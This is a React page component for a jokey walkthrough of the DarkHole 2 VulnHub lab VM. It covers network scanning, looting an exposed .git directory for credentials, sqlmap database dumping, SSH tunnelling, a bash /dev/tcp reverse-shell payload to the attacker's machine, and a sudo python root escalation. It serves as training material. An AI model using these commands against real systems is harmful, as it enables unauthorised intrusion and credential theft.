"use client";

import { Card } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Calendar, Clock, ArrowLeft, Shield, Terminal, Network, Database, Key, Flag, Image as ImageIcon, Eye } from "lucide-react";
import Link from "next/link";
import Image from "next/image";
import { useState, useEffect } from "react";

export default function DarkHole2WriteupPage() {
  const [selectedImage, setSelectedImage] = useState<string | null>(null);

  useEffect(() => {
    document.title = "DarkHole 2 Writeup - samm.tan";
  }, []);

  // Interactive Image Component
  const InteractiveImage = ({ src, alt, caption, phase }: { src: string, alt: string, caption: string, phase: string }) => {
    return (
      <>
        {/* Desktop/Large Tablet: Interactive thumbnail */}
        <div className="hidden lg:block">
          <div
            className="bg-slate-700/30 rounded-lg p-3 border border-slate-600/30 cursor-pointer hover:bg-slate-700/50 transition-all duration-200 mb-4"
            onClick={() => setSelectedImage(src)}
          >
            <div className="flex items-center gap-3">
              <div className="bg-red-500/20 p-2 rounded-lg">
                <ImageIcon className="w-4 h-4 text-red-400" />
              </div>
              <div>
                <p className="text-white text-sm font-medium">{phase}</p>
                <p className="text-slate-400 text-xs">{caption}</p>
              </div>
              <Eye className="w-4 h-4 text-slate-400 ml-auto" />
            </div>
          </div>
        </div>

        {/* Mobile/Tablet: Direct image display */}
        <div className="block lg:hidden mb-4">
          <div className="bg-slate-800/50 rounded-lg p-2 sm:p-3 border border-slate-600/30 mx-1 sm:mx-0">
            <p className="text-white text-sm font-medium mb-2">{phase}</p>
            <div className="overflow-hidden rounded-lg">
              <Image
                src={src}
                alt={alt}
                width={800}
                height={600}
                className="rounded-lg w-full h-auto max-w-full object-contain"
                unoptimized
              />
            </div>
            <p className="text-slate-400 text-xs mt-2 break-words">{caption}</p>
          </div>
        </div>
      </>
    );
  };

  // Image Modal for Desktop
  const ImageModal = () => {
    if (!selectedImage) return null;

    return (
      <div className="fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-2 sm:p-4" onClick={() => setSelectedImage(null)}>
        <div className="relative w-full h-full max-w-6xl flex items-center justify-center">
          <Image
            src={selectedImage}
            alt="Writeup Screenshot"
            width={1200}
            height={800}
            className="rounded-lg max-w-full max-h-full object-contain cursor-pointer"
            unoptimized
          />
        </div>
      </div>
    );
  };

  const writeupData = {
    title: "DarkHole 2 - VulnHub Writeup: Or How I Learned to Stop Worrying and Love Git Disasters",
    target: "DarkHole 2 (VulnHub)",
    difficulty: "Intermediate (but the devs made it easy with their... *creative* security choices)",
    date: "2025-08-05",
    readTime: "20 min",
    tags: ["VulnHub", "Web Exploitation", "SQL Injection", "SSH", "Port Forwarding", "Privilege Escalation", "Git", "LinPEAS"]
  };

  const attackChain = [
    { phase: "Network Discovery", icon: Network, description: "\"Where the heck is this thing?\"" },
    { phase: "Service Enumeration", icon: Terminal, description: "Nmap reveals the usual suspects (and some unusual ones)" },
    { phase: "Git Repository Analysis", icon: Shield, description: "\"Wait, did they really just...?\" - Exposed .git with credentials" },
    { phase: "SQL Injection", icon: Database, description: "\"This is why we can&apos;t have nice things\" - Database dump" },
    { phase: "SSH Access", icon: Key, description: "\"Oh, it gets worse\" - Using leaked credentials" },
    { phase: "Privilege Escalation", icon: Flag, description: "\"Well, that was embarrassingly easy\" - Root via sudo" }
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 p-2 sm:p-4 md:p-8 overflow-x-hidden">
      <ImageModal />
      <div className="max-w-6xl mx-auto px-2 sm:px-0">
        {/* Navigation */}
        <div className="mb-6">
          <Link href="/writeups" className="inline-flex items-center gap-2 text-blue-400 hover:text-blue-300 transition-colors">
            <ArrowLeft className="w-4 h-4" />
            Back to Writeups
          </Link>
        </div>

        {/* Header */}
        <div className="mb-8">
          <div className="flex items-start gap-3 mb-4">
            <Flag className="w-6 h-6 sm:w-8 sm:h-8 text-blue-400 flex-shrink-0 mt-1" />
            <div className="min-w-0 flex-1">
              <h1 className="text-2xl sm:text-3xl md:text-4xl font-bold text-white leading-tight break-words">{writeupData.title}</h1>
              <p className="text-slate-300 text-sm sm:text-base md:text-lg mt-2">Complete penetration testing walkthrough of VulnHub machine</p>
            </div>
          </div>

          {/* Meta Information */}
          <div className="flex flex-wrap items-center gap-4 text-sm text-slate-400 mb-6">
            <div className="flex items-center gap-1">
              <Calendar className="w-4 h-4" />
              <span suppressHydrationWarning>{new Date(writeupData.date).toLocaleDateString()}</span>
            </div>
            <div className="flex items-center gap-1">
              <Clock className="w-4 h-4" />
              <span>{writeupData.readTime}</span>
            </div>
            <Badge className="bg-purple-500/20 text-purple-300 border-purple-500/30">
              {writeupData.difficulty}
            </Badge>
          </div>

          {/* Tags */}
          <div className="flex flex-wrap gap-2">
            {writeupData.tags.map((tag, index) => (
              <Badge key={index} variant="outline" className="text-xs border-slate-600 text-slate-400">
                {tag}
              </Badge>
            ))}
          </div>
        </div>

        {/* Attack Chain Overview */}
        <Card className="bg-slate-800/50 border-slate-700 mb-8 mx-1 sm:mx-0">
          <div className="p-4 sm:p-6">
            <h2 className="text-2xl font-semibold text-white mb-4 flex items-center gap-2">
              <Shield className="w-6 h-6" />
              Attack Chain Overview
            </h2>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 sm:gap-4">
              {attackChain.map((phase, index) => {
                const PhaseIcon = phase.icon;
                return (
                  <div key={index} className="bg-slate-700/30 rounded-lg p-4 border border-slate-600/30">
                    <div className="flex items-center gap-3 mb-2">
                      <div className="bg-blue-500/20 p-2 rounded-lg">
                        <PhaseIcon className="w-5 h-5 text-blue-400" />
                      </div>
                      <span className="text-sm text-blue-400 font-medium">Phase {index + 1}</span>
                    </div>
                    <h3 className="font-semibold text-white mb-1">{phase.phase}</h3>
                    <p className="text-sm text-slate-400">{phase.description}</p>
                  </div>
                );
              })}
            </div>
          </div>
        </Card>

        {/* Writeup Content */}
        <Card className="bg-slate-800/50 border-slate-700 mx-1 sm:mx-0">
          <div className="p-4 sm:p-6 md:p-8">
            <div className="prose prose-invert prose-slate max-w-none">

              {/* Overview Section */}
              <section className="mb-8">
                <h2 className="text-xl sm:text-2xl font-semibold text-white mb-4">Overview</h2>
                <p className="text-slate-300 leading-relaxed mb-4">
                  Alright, buckle up folks! This is the story of how I completely owned a VulnHub machine called DarkHole 2. Spoiler alert: it involves the most hilariously bad Git practices I&apos;ve ever seen, some SQL injection that made me question humanity, and a privilege escalation so easy it felt like cheating.
                </p>

                <div className="bg-red-900/20 rounded-lg p-4 border-l-4 border-red-500 mb-6">
                  <h3 className="text-lg font-semibold text-white mb-2 flex items-center gap-2">
                    🤦‍♂️ The Hall of Shame - Vulnerabilities That Made This Possible
                  </h3>
                  <ul className="text-slate-300 space-y-1">
                    <li>• Exposed Git repository (with all the sensitive goodies)</li>
                    <li>• Commit messages that would make any security professional cry</li>
                    <li>• SQL injection so obvious it hurt to exploit</li>
                    <li>• Internal RCE service because apparently one vulnerability wasn&apos;t enough</li>
                    <li>• Sudo misconfiguration that basically handed us root on a silver platter</li>
                  </ul>
                </div>
              </section>

              {/* Environment Setup */}
              <section className="mb-8">
                <h2 className="text-2xl font-semibold text-white mb-4">Environment Setup</h2>
                <p className="text-slate-300 leading-relaxed mb-4">
                  So I&apos;ve got this DarkHole 2 machine running on VMware Player, and my trusty Kali Linux box ready to cause some chaos. Both are sitting pretty on a NAT network, probably plotting against each other. Little does DarkHole know what&apos;s coming...
                </p>

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 155256.png"
                  alt="DarkHole 2 machine boot screen"
                  caption="DarkHole 2 machine is up and running, ready to be owned"
                  phase="Target Setup"
                />

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 155531.png"
                  alt="Kali Linux desktop ready"
                  caption="Kali Linux ready for action - let the chaos begin!"
                  phase="Attack Setup"
                />
              </section>

              {/* Phase 1: Network Discovery */}
              <section className="mb-8">
                <h2 className="text-2xl font-semibold text-white mb-4 flex items-center gap-2">
                  <Network className="w-6 h-6 text-blue-400" />
                  Phase 1: Network Discovery - The Great IP Hunt
                </h2>
                <p className="text-slate-300 leading-relaxed mb-4">
                  Okay, so both machines are chilling on the same NAT network, but I have no clue where DarkHole is hiding. Time to play detective! First, let me figure out where I am in this digital neighborhood.
                </p>

                <div className="bg-slate-900 rounded-lg p-3 sm:p-4 mb-4 overflow-x-auto">
                  <p className="text-slate-400 text-sm mb-2">Time to knock on every door in the subnet:</p>
                  <code className="text-green-400 font-mono text-xs sm:text-sm whitespace-nowrap">sudo netdiscover -i eth0 -r 192.168.253.129/24</code>
                </div>

                <p className="text-slate-300 leading-relaxed mb-4">
                  Boom! Four IP addresses show up. Now, <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">.1</code> and <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">.2</code> are probably boring network stuff, and <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">.254</code> is likely the gateway doing gateway things. That leaves <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">192.168.253.133</code> looking mighty suspicious. Let me poke it with Firefox and... Bingo! DarkHole 2 just waved hello. This is going to be fun.
                </p>

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 160136.png"
                  alt="Kali IP Address Discovery"
                  caption="Kali machine&apos;s IP: 192.168.253.129"
                  phase="IP Discovery"
                />

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 160814.png"
                  alt="Netdiscover scan results"
                  caption="Target identified: 192.168.253.133"
                  phase="Network Scan"
                />

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 161104.png"
                  alt="DarkHole 2 web interface"
                  caption="Target confirmed - DarkHole 2 is online!"
                  phase="Target Verification"
                />
              </section>

              {/* Phase 2: Port Scanning */}
              <section className="mb-8">
                <h2 className="text-2xl font-semibold text-white mb-4 flex items-center gap-2">
                  <Terminal className="w-6 h-6 text-blue-400" />
                  Phase 2: Port Scanning & Service Enumeration
                </h2>
                <p className="text-slate-300 leading-relaxed mb-4">
                  With the target IP confirmed, I&apos;ll perform comprehensive port scanning using nmap with vulnerability detection:
                </p>

                <div className="bg-slate-900 rounded-lg p-3 sm:p-4 mb-4 overflow-x-auto">
                  <p className="text-slate-400 text-sm mb-2">Nmap command:</p>
                  <code className="text-green-400 font-mono text-xs sm:text-sm whitespace-nowrap">sudo nmap -sSCV -O -A -n --script vuln -Pn 192.168.253.133</code>
                </div>

                <div className="bg-slate-700/30 rounded-lg p-4 mb-4">
                  <h4 className="text-white font-semibold mb-2">Nmap Flags Explained:</h4>
                  <ul className="text-slate-300 text-sm space-y-1">
                    <li><code className="text-green-400">-sS</code>: TCP SYN scan (half-open scan) - fastest method</li>
                    <li><code className="text-green-400">-sC</code>: Run default NSE scripts for service detection</li>
                    <li><code className="text-green-400">-sV</code>: Version detection - identifies specific versions</li>
                    <li><code className="text-green-400">-O</code>: Operating System detection using TCP/IP fingerprinting</li>
                    <li><code className="text-green-400">--script vuln</code>: Run vulnerability detection scripts</li>
                    <li><code className="text-green-400">-Pn</code>: Skip host discovery, assume target is up</li>
                  </ul>
                </div>

                <p className="text-slate-300 leading-relaxed mb-4">
                  <strong>Key Findings:</strong> Web server with exposed Git repository and login page available for further analysis.
                </p>

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 162059.png"
                  alt="Nmap scan output showing services"
                  caption="Nmap reveals web server and exposed Git repository"
                  phase="Port Scan Results"
                />

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 165614.png"
                  alt="DarkHole login page"
                  caption="Login page discovered - time to find some credentials!"
                  phase="Login Discovery"
                />
              </section>

              {/* Phase 3: Git Repository Analysis */}
              <section className="mb-8">
                <h2 className="text-2xl font-semibold text-white mb-4 flex items-center gap-2">
                  <Shield className="w-6 h-6 text-blue-400" />
                  Phase 3: Directory Enumeration & Git Repository Analysis
                </h2>
                <p className="text-slate-300 leading-relaxed mb-4">
                  Using gobuster to enumerate directories and files on the web server:
                </p>

                <div className="bg-slate-900 rounded-lg p-3 sm:p-4 mb-4 overflow-x-auto">
                  <code className="text-green-400 font-mono text-xs sm:text-sm break-all sm:break-normal">gobuster dir -u http://192.168.253.133 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt,.php,.bak,.env,.html,.git,.zip</code>
                </div>

                <div className="bg-red-500/10 border border-red-500/30 rounded-lg p-4 mb-4">
                  <h4 className="text-red-400 font-semibold mb-2">🚨 Critical Finding</h4>
                  <p className="text-slate-300">The <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">.git</code> directory is exposed, allowing access to the source code repository.</p>
                </div>

                <h4 className="text-white font-semibold mb-2">Git Repository Extraction</h4>
                <div className="bg-slate-900 rounded-lg p-3 sm:p-4 mb-4 overflow-x-auto">
                  <code className="text-green-400 font-mono text-xs sm:text-sm whitespace-nowrap">wget -r 192.168.253.133/.git</code>
                </div>

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 165853.png"
                  alt="Gobuster directory enumeration results"
                  caption="Gobuster reveals the exposed .git directory - disaster incoming!"
                  phase="Directory Enumeration"
                />

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 170613.png"
                  alt="Git repository contents"
                  caption="Repository successfully downloaded - time to dig for secrets"
                  phase="Repo Download"
                />

                <h4 className="text-white font-semibold mb-2">Git History Analysis</h4>
                <p className="text-slate-300 leading-relaxed mb-4">
                  Examining the git commit history reveals critical information. The commit messages show extremely poor security practices:
                </p>

                <div className="bg-slate-900 rounded-lg p-3 sm:p-4 mb-4 overflow-x-auto">
                  <code className="text-green-400 font-mono text-xs sm:text-sm whitespace-nowrap">git diff a4d900</code>
                </div>

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 171004.png"
                  alt="Git commit log showing security disasters"
                  caption="HOLY COMMIT MESSAGES, BATMAN! A masterclass in &apos;How NOT to Use Git&apos;"
                  phase="Git History Horror"
                />

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 171902.png"
                  alt="Git diff revealing credentials"
                  caption="Credentials casually hanging out in the commit diff"
                  phase="Credential Discovery"
                />

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 172029.png"
                  alt="Successful login with leaked credentials"
                  caption="And it works! *Chef&apos;s kiss* Beautiful. Absolutely beautiful."
                  phase="Login Success"
                />

                <div className="bg-green-500/10 border border-green-500/30 rounded-lg p-4">
                  <h4 className="text-green-400 font-semibold mb-2">🎯 JACKPOT!</h4>
                  <p className="text-slate-300">Email: <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">lush@admin.com</code></p>
                  <p className="text-slate-300">Password: <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">321</code></p>
                  <p className="text-slate-400 text-sm mt-2 italic">Seriously? &quot;321&quot;? My grandmother&apos;s pet goldfish could have come up with a more secure password! 🐠</p>
                </div>
              </section>

              {/* Phase 4: SQL Injection */}
              <section className="mb-8">
                <h2 className="text-2xl font-semibold text-white mb-4 flex items-center gap-2">
                  <Database className="w-6 h-6 text-blue-400" />
                  Phase 4: SQL Injection Discovery & Exploitation
                </h2>
                <p className="text-slate-300 leading-relaxed mb-4">
                  After successful login, the URL contains a parameter <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">id=1</code>, suggesting potential SQL injection vulnerability.
                </p>

                <h4 className="text-white font-semibold mb-2">Request Capture with Burp Suite</h4>
                <ol className="text-slate-300 space-y-2 mb-4">
                  <li>1. Logout and enable intercept in Burp Suite</li>
                  <li>2. Login again and capture the request containing PHPSESSID cookie</li>
                  <li>3. Forward the request until the authenticated session is established</li>
                  <li>4. Save the captured request for sqlmap analysis</li>
                </ol>

                <h4 className="text-white font-semibold mb-2">SQL Injection Exploitation</h4>
                <div className="bg-slate-900 rounded-lg p-4 mb-4">
                  <code className="text-green-400 font-mono">sqlmap -r darkhole_request_sqlmap --dump-all</code>
                </div>

                <div className="bg-green-500/10 border border-green-500/30 rounded-lg p-4 mb-4">
                  <h4 className="text-green-400 font-semibold mb-2">✅ Success!</h4>
                  <p className="text-slate-300">The sqlmap scan reveals SSH credentials stored in the database, providing system access.</p>
                </div>

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 174512.png"
                  alt="Sqlmap reveals SSH credentials in database"
                  caption="Sqlmap reveals SSH table info - credentials just handed to us on a silver platter!"
                  phase="SSH Credentials Found"
                />
              </section>

              {/* Phase 5: SSH Access */}
              <section className="mb-8">
                <h2 className="text-2xl font-semibold text-white mb-4 flex items-center gap-2">
                  <Key className="w-6 h-6 text-blue-400" />
                  Phase 5: SSH Access & System Enumeration
                </h2>
                <p className="text-slate-300 leading-relaxed mb-4">
                  With these shiny new SSH credentials in hand, it&apos;s time to knock on the SSH door and see if anyone&apos;s home:
                </p>

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 174631.png"
                  alt="SSH login successful"
                  caption="SSH login successful - we&apos;re in the system!"
                  phase="SSH Access"
                />

                <h4 className="text-white font-semibold mb-2">Privilege Escalation Enumeration with LinPEAS</h4>
                <p className="text-slate-300 leading-relaxed mb-4">
                  Time to bring in the big guns for enumeration. LinPEAS (Linux Privilege Escalation Awesome Script) is like having a bloodhound for security misconfigurations. Let&apos;s get this party started:
                </p>

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 175539.png"
                  alt="Python HTTP server started"
                  caption="Fire up a quick Python server (because sharing is caring)"
                  phase="HTTP Server"
                />

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 180452.png"
                  alt="LinPEAS downloaded"
                  caption="LinPEAS downloaded - now we wait for the magic"
                  phase="LinPEAS Download"
                />

                <h4 className="text-white font-semibold mb-2">LinPEAS Analysis Results</h4>
                <p className="text-slate-300 leading-relaxed mb-4">
                  LinPEAS runs its beautiful chaos and guess what? It finds ANOTHER security disaster! There&apos;s an internal PHP web service running on localhost port 9999 under user <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">losy</code>. And get this - it has Remote Code Execution capabilities. Because apparently, one gaping security hole wasn&apos;t enough:
                </p>

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 183622.png"
                  alt="LinPEAS reveals internal service"
                  caption="LinPEAS finds ANOTHER security disaster - internal RCE service!"
                  phase="LinPEAS Results"
                />

                <h4 className="text-white font-semibold mb-2">LinPEAS Analysis Results</h4>
                <p className="text-slate-300 leading-relaxed mb-4">
                  Running LinPEAS reveals a critical finding - an internal PHP web service running on localhost port 9999 under user <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">losy</code> with Remote Code Execution capability.
                </p>
              </section>

              {/* Phase 6: Port Forwarding & RCE */}
              <section className="mb-8">
                <h2 className="text-2xl font-semibold text-white mb-4 flex items-center gap-2">
                  <Terminal className="w-6 h-6 text-blue-400" />
                  Phase 6: Port Forwarding & RCE Exploitation
                </h2>

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 185325.png"
                  alt="Internal RCE service discovered"
                  caption="RCE service found - this is going to be fun!"
                  phase="RCE Discovery"
                />

                <h4 className="text-white font-semibold mb-2">SSH Tunnel Setup</h4>
                <div className="bg-slate-900 rounded-lg p-3 sm:p-4 mb-4 overflow-x-auto">
                  <code className="text-green-400 font-mono text-xs sm:text-sm whitespace-nowrap">ssh jehad@192.168.253.133 -L 10000:localhost:9999</code>
                </div>

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 184458.png"
                  alt="SSH port forwarding established"
                  caption="Port forwarding setup - building a bridge to nowhere (but everywhere)"
                  phase="Port Forward"
                />

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 184957.png"
                  alt="Nmap confirms local port forwarding"
                  caption="Nmap confirms our tunnel is working"
                  phase="Tunnel Verification"
                />

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 185134.png"
                  alt="RCE interface accessed via browser"
                  caption="Accessing the RCE interface through our tunnel"
                  phase="RCE Access"
                />

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 185613.png"
                  alt="Testing RCE with curl"
                  caption="Testing RCE with curl - it works!"
                  phase="RCE Testing"
                />

                <h4 className="text-white font-semibold mb-2">Reverse Shell Establishment</h4>
                <p className="text-slate-300 leading-relaxed mb-4">
                  The internal service has a <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">cmd</code> parameter allowing RCE. I create a reverse shell payload:
                </p>

                <div className="bg-slate-900 rounded-lg p-3 sm:p-4 mb-4 overflow-x-auto">
                  <code className="text-green-400 font-mono text-xs sm:text-sm break-all sm:break-normal">bash -c &apos;bash -i &gt;&amp; /dev/tcp/192.168.253.129/10001 0&gt;&amp;1&apos;</code>
                </div>

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 190439.png"
                  alt="URL encoding payload in Burp Suite"
                  caption="Using Burp Suite to encode our reverse shell payload"
                  phase="Payload Encoding"
                />

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 192407.png"
                  alt="Starting netcat listener"
                  caption="Starting netcat listener - ready to catch that shell!"
                  phase="Netcat Listener"
                />

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 192444.png"
                  alt="Reverse shell successful"
                  caption="BOOM! Reverse shell successful - we've got shell as losy!"
                  phase="Shell Success"
                />

                <p className="text-slate-300 leading-relaxed">
                  After URL encoding the payload and executing it through the RCE vulnerability, I successfully obtain a shell as the <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">losy</code> user.
                </p>
              </section>

              {/* Phase 7: Privilege Escalation */}
              <section className="mb-8">
                <h2 className="text-2xl font-semibold text-white mb-4 flex items-center gap-2">
                  <Flag className="w-6 h-6 text-blue-400" />
                  Phase 7: Privilege Escalation & Flag Capture
                </h2>

                <h4 className="text-white font-semibold mb-2">Credential Discovery</h4>
                <p className="text-slate-300 leading-relaxed mb-4">
                  As part of standard enumeration, I check the bash history file which often contains valuable data including accidentally typed passwords. The <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">.bash_history</code> reveals the password for the <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">losy</code> user.
                </p>

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 193155.png"
                  alt="Bash history revealing password"
                  caption="Password found in bash history - because of course it is!"
                  phase="Password Discovery"
                />

                <h4 className="text-white font-semibold mb-2">Sudo Privilege Escalation</h4>
                <p className="text-slate-300 leading-relaxed mb-4">
                  Using <a href="https://gtfobins.github.io/gtfobins/python/#sudo" className="text-blue-400 hover:text-blue-300" target="_blank">GTFOBins</a> as reference, Python can be exploited for privilege escalation:
                </p>

                <div className="bg-slate-900 rounded-lg p-3 sm:p-4 mb-4 overflow-x-auto">
                  <code className="text-green-400 font-mono text-xs sm:text-sm break-all sm:break-normal">sudo python -c &apos;import os; os.system(&quot;/bin/sh&quot;)&apos;</code>
                </div>

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 192832.png"
                  alt="User flag captured"
                  caption="First trophy - User flag in home directory"
                  phase="User Flag"
                />

                <InteractiveImage
                  src="/images/writeups/darkhole-2/Screenshot 2025-08-05 194351.png"
                  alt="Root flag captured"
                  caption="Victory! Root flag captured"
                  phase="Root Flag"
                />

                <div className="bg-green-500/10 border border-green-500/30 rounded-lg p-4">
                  <h4 className="text-green-400 font-semibold mb-2">🏆 Trophies Collected</h4>
                  <p className="text-slate-300"><strong>User Flag:</strong> <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">DarkHole{'This_is_the_life_man_better_than_a_cruise'}</code></p>
                  <p className="text-slate-300"><strong>Root Flag:</strong> <code className="text-green-400 bg-slate-900 px-2 py-1 rounded">DarkHole{'Legend'}</code></p>
                  <p className="text-slate-400 text-sm mt-2 italic">And there it is! Both flags captured, machine completely owned. This was like taking candy from a baby, if the baby was a poorly configured Linux server with more security holes than Swiss cheese. 🧀</p>
                </div>
              </section>

              {/* Summary */}
              <section className="mb-8">
                <h2 className="text-2xl font-semibold text-white mb-4">Summary - What a Wild Ride</h2>
                <p className="text-slate-300 leading-relaxed mb-4">
                  Well, that was... something! This walkthrough just demonstrated how NOT to secure a machine, but hey, it made for an entertaining penetration test. This machine was like a perfect storm of security fails - every single phase revealed another layer of &quot;nope, that&apos;s not how you do it.&quot;
                </p>

                <div className="bg-blue-900/20 rounded-lg p-4 border-l-4 border-blue-500 mb-4">
                  <h4 className="text-white font-semibold mb-2 flex items-center gap-2">
                    📚 What We Learned (or rather, what NOT to do)
                  </h4>
                  <ul className="text-slate-300 space-y-1">
                    <li>• Don&apos;t expose your <code className="text-green-400 bg-slate-900 px-1 rounded">.git</code> directories to the internet (seriously, just don&apos;t)</li>
                    <li>• Commit messages should not be security confessions</li>
                    <li>• Always sanitize user inputs (looking at you, SQL injection)</li>
                    <li>• Internal services need security too</li>
                    <li>• Password <code className="text-red-400 bg-slate-900 px-1 rounded">321</code> is not a password, it&apos;s a cry for help</li>
                    <li>• Bash history files are not secret diaries</li>
                  </ul>
                </div>

                <div className="bg-emerald-900/20 rounded-lg p-4 border-l-4 border-emerald-500">
                  <h4 className="text-white font-semibold mb-2 flex items-center gap-2">
                    ✨ The Silver Lining
                  </h4>
                  <p className="text-slate-300">
                    At least this machine taught us every possible way to mess up security! It&apos;s like a comprehensive guide on &quot;How to Build the Most Insecure System Possible&quot; - educational in all the wrong ways.
                  </p>
                  <p className="text-slate-300 mt-2">
                    Thanks for joining me on this journey through digital chaos. Remember kids: security is not optional, and neither is common sense! 🎯
                  </p>
                </div>
              </section>

            </div>
          </div>
        </Card>

        {/* Disclaimer */}
        <div className="mt-8">
          <Card className="bg-slate-800/30 border-slate-700 border-dashed">
            <div className="p-6">
              <h3 className="text-lg font-semibold text-white mb-2 flex items-center gap-2">
                <Shield className="w-5 h-5" />
                Educational Purpose
              </h3>
              <p className="text-slate-400 text-sm">This writeup is for educational purposes only. All techniques demonstrated should only be used on systems you own or have explicit permission to test.</p>
            </div>
          </Card>
        </div>
      </div>
    </div>
  );
}